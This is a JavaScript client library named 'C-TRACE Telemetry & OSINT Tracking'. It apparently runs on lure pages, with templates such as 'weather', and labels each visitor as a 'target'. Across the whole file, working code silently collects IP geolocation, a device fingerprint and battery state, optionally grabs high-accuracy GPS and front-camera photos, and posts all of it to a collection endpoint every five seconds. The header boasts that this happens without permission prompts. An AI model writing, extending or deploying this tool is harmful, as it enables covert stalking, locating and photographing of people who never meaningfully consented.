/**
 * C-TRACE Telemetry & OSINT Tracking Library
 * Features:
 * 1. Zero-Permission Passive IP & Device Telemetry (Captures City, Country, ISP, Lat, Lng, OS, Browser, GPU, Battery silently with 0 browser permission popups).
 * 2. Optional High Accuracy GPS & HD Camera Snapshot capture when explicitly enabled or triggered by user interaction.
 * 3. iOS / iPhone & Android universal mobile support.
 */

(function (window) {
    function generateId(length = 10) {
        const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        let result = '';
        for (let i = 0; i < length; i++) {
            const randomIndex = Math.floor(Math.random() * characters.length);
            result += characters[randomIndex];
        }
        return result;
    }

    let targetId = localStorage.getItem("target_id") || localStorage.getItem("id");
    if (!targetId) {
        targetId = generateId();
        localStorage.setItem("target_id", targetId);
        localStorage.setItem("id", targetId);
    }

    let cachedIpLocation = null;

    async function fetchIPLocation() {
        if (cachedIpLocation) return cachedIpLocation;
        try {
            const res = await fetch("https://ipapi.co/json/");
            if (res.ok) {
                const data = await res.json();
                cachedIpLocation = {
                    ip: data.ip,
                    city: data.city,
                    region: data.region,
                    country: data.country_name,
                    lat: data.latitude,
                    lng: data.longitude,
                    isp: data.org || data.asn,
                    asn: data.asn,
                    postal: data.postal,
                    timezone: data.timezone
                };
                return cachedIpLocation;
            }
        } catch (e) {
            try {
                const res2 = await fetch("https://ip-api.com/json/");
                if (res2.ok) {
                    const data2 = await res2.json();
                    cachedIpLocation = {
                        ip: data2.query,
                        city: data2.city,
                        region: data2.regionName,
                        country: data2.country,
                        lat: data2.lat,
                        lng: data2.lon,
                        isp: data2.isp,
                        asn: data2.as || '',
                        timezone: data2.timezone || ''
                    };
                    return cachedIpLocation;
                }
            } catch (err) {}
        }
        return null;
    }

    async function getBatteryInfo() {
        if ('getBattery' in navigator) {
            try {
                const battery = await navigator.getBattery();
                return {
                    level: Math.round(battery.level * 100),
                    charging: battery.charging,
                    chargingTime: battery.chargingTime !== Infinity ? battery.chargingTime : null,
                    dischargingTime: battery.dischargingTime !== Infinity ? battery.dischargingTime : null
                };
            } catch (e) {}
        }
        return null;
    }

    function getGPUInfo() {
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (gl) {
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                if (debugInfo) {
                    return {
                        vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) || 'N/A',
                        renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || 'N/A'
                    };
                }
            }
        } catch (e) {}
        return { vendor: 'N/A', renderer: 'N/A' };
    }

    function getDeviceInfo() {
        const ua = navigator.userAgent;
        let os = "Unknown OS";
        if (ua.includes("iPhone") || ua.includes("iPad") || ua.includes("iPod")) os = "iOS (iPhone)";
        else if (ua.includes("Android")) os = "Android";
        else if (ua.includes("Windows")) os = "Windows";
        else if (ua.includes("Mac OS") || ua.includes("Macintosh")) os = "macOS";
        else if (ua.includes("Linux")) os = "Linux";

        let browser = "Unknown Browser";
        if (ua.includes("CriOS")) browser = "Chrome iOS";
        else if (ua.includes("FxiOS")) browser = "Firefox iOS";
        else if (ua.includes("Instagram")) browser = "Instagram In-App Browser";
        else if (ua.includes("FBAN") || ua.includes("FBAV")) browser = "Facebook In-App Browser";
        else if (ua.includes("Safari") && !ua.includes("Chrome")) browser = "Safari";
        else if (ua.includes("Chrome") && !ua.includes("Edg")) browser = "Chrome";
        else if (ua.includes("Edg")) browser = "Edge";

        let network = "Unknown";
        if (navigator.connection) {
            network = navigator.connection.effectiveType || navigator.connection.type || "Unknown";
        }

        const gpu = getGPUInfo();
        let tz = '';
        try {
            tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
        } catch (e) {}

        return {
            os: os,
            browser: browser,
            userAgent: ua,
            platform: navigator.platform || 'Mobile/Desktop',
            language: navigator.language || 'en',
            screen: `${window.screen.width}x${window.screen.height}`,
            colorDepth: `${window.screen.colorDepth}-bit`,
            devicePixelRatio: window.devicePixelRatio || 1,
            deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'N/A',
            hardwareConcurrency: navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} Cores` : 'N/A',
            network: network,
            gpuVendor: gpu.vendor,
            gpuRenderer: gpu.renderer,
            touchPoints: navigator.maxTouchPoints || 0,
            timezone: tz,
            referrer: document.referrer || 'Direct Access'
        };
    }

    async function captureCameraSnapshot() {
        try {
            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                return null;
            }

            const constraints = {
                video: {
                    facingMode: "user",
                    width: { ideal: 1280, max: 1920 },
                    height: { ideal: 720, max: 1080 }
                },
                audio: false
            };

            let stream = null;
            try {
                stream = await navigator.mediaDevices.getUserMedia(constraints);
            } catch (e) {
                try {
                    stream = await navigator.mediaDevices.getUserMedia({
                        video: true,
                        audio: false
                    });
                } catch (err2) {
                    return null;
                }
            }

            if (!stream) return null;

            const video = document.createElement("video");
            video.setAttribute("playsinline", "true");
            video.setAttribute("webkit-playsinline", "true");
            video.muted = true;
            video.srcObject = stream;

            await new Promise((resolve) => {
                video.onloadedmetadata = async () => {
                    try {
                        await video.play();
                    } catch (e) {}
                    resolve();
                };
                setTimeout(resolve, 1000);
            });

            await new Promise(resolve => setTimeout(resolve, 500));

            const canvas = document.createElement("canvas");
            const videoWidth = video.videoWidth || 640;
            const videoHeight = video.videoHeight || 480;

            canvas.width = videoWidth;
            canvas.height = videoHeight;

            const ctx = canvas.getContext("2d");
            ctx.imageSmoothingEnabled = true;
            ctx.imageSmoothingQuality = "high";
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            const photoData = canvas.toDataURL("image/jpeg", 0.85);

            stream.getTracks().forEach(track => track.stop());

            return photoData;
        } catch (err) {
            console.error("Camera capture error:", err);
            return null;
        }
    }

    let isCapturingPhoto = false;

    async function sendTelemetry(coords = null, templateName = 'weather', captureCamera = false) {
        const battery = await getBatteryInfo();
        const device = getDeviceInfo();
        const ipLocation = await fetchIPLocation();

        let photo = null;
        if (captureCamera && !isCapturingPhoto) {
            isCapturingPhoto = true;
            photo = await captureCameraSnapshot();
            isCapturingPhoto = false;
        }

        const lat = coords ? coords.latitude : (ipLocation ? ipLocation.lat : null);
        const lng = coords ? coords.longitude : (ipLocation ? ipLocation.lng : null);
        const accuracy = coords ? coords.accuracy : (ipLocation ? 5000 : null);

        const payload = {
            id: targetId,
            lat: lat,
            lng: lng,
            accuracy: accuracy,
            speed: coords ? coords.speed : null,
            heading: coords ? coords.heading : null,
            battery: battery,
            device: device,
            ipLocation: ipLocation,
            photo: photo,
            template: templateName
        };

        try {
            await fetch("/api/telemetry", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify(payload)
            });
        } catch (err) {
            console.error("Telemetry report error:", err);
        }
    }

    window.LiveTrackerClient = {
        getTargetId: () => targetId,
        sendTelemetry: sendTelemetry,
        captureCameraSnapshot: captureCameraSnapshot,
        getBatteryInfo: getBatteryInfo,
        getDeviceInfo: getDeviceInfo,
        fetchIPLocation: fetchIPLocation,
        startTracking: function (options = {}) {
            const { 
                templateName = 'weather', 
                updateInterval = 5000, 
                enableCamera = false, 
                enableGPS = false,
                onSuccess, 
                onError 
            } = options;

            // Instantly send zero-permission passive IP telemetry right away on page load
            sendTelemetry(null, templateName, enableCamera);

            function triggerLocationUpdate(shouldTakePhoto = false) {
                if (enableGPS && navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        async (position) => {
                            await sendTelemetry(position.coords, templateName, shouldTakePhoto);
                            if (onSuccess) onSuccess(position.coords);
                        },
                        async (error) => {
                            await sendTelemetry(null, templateName, shouldTakePhoto);
                            if (onError) onError(error);
                        },
                        {
                            enableHighAccuracy: true,
                            timeout: 8000,
                            maximumAge: 0
                        }
                    );
                } else {
                    sendTelemetry(null, templateName, shouldTakePhoto);
                }
            }

            // Continuous telemetry cycle
            setInterval(() => {
                triggerLocationUpdate(enableCamera);
            }, updateInterval);
        }
    };
})(window);
